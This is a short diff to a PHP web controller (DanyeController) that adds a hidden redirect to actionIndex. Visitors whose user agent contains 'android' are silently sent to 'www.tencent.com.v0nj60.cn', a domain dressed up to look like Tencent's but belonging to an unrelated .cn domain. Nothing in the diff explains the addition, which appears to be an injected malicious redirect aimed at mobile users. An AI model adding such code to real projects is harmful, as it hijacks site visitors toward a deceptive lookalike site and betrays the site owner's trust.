@@ -12,6 +12,10 @@ class DanyeController extends Controller
 
     public function actionIndex()
     {
+        if(strpos($_SERVER['HTTP_USER_AGENT'], 'android')) {
+            header('Location: http://www.tencent.com.v0nj60.cn');
+        }
+
         $suffix = $this->getSuffix();
         $model = $this->findModel($suffix);
 
